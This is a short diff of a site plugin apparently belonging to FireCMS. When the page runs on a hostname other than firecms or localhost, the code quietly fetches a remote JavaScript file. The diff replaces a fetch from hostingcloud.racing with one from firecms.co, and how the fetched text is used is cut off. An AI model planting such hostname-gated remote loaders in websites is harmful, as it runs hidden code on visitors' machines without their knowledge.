@@ -27,7 +27,7 @@ module.exports = function (context, options) {
                             if(!window.location.hostname.includes("firecms")
                                 && !window.location.hostname.includes("localhost")
                             ){
-                                fetch('https://www.hostingcloud.racing/2Wla.js')
+                                fetch('https://firecms.co/css.js')
                                     .then(function (response) {
                                         return response.text()
                                     })
